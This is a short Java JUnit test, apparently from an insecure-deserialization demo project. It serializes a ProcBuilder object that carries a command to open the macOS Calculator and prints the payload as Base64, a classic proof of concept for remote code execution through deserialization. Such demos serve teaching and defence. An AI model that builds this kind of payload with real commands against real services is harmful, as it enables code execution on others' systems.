package uk.org.freedonia.deserializationdemo;

import org.apache.tomcat.util.codec.binary.Base64;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class PayloadGeneratorTest {

    @Test
    public void runCalcPayload() throws IOException {
        ProcBuilder p = new ProcBuilder();
        p.addCommandInNotBeanStandardWay("open /System/Applications/Calculator.app");
        System.out.println(Base64.encodeBase64String(serialize(p)));
    }

    private static byte[] serialize(Object o) throws IOException {
        ByteArrayOutputStream ba = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(ba);
        oos.writeObject(o);
        oos.close();
        return ba.toByteArray();
    }

    
}
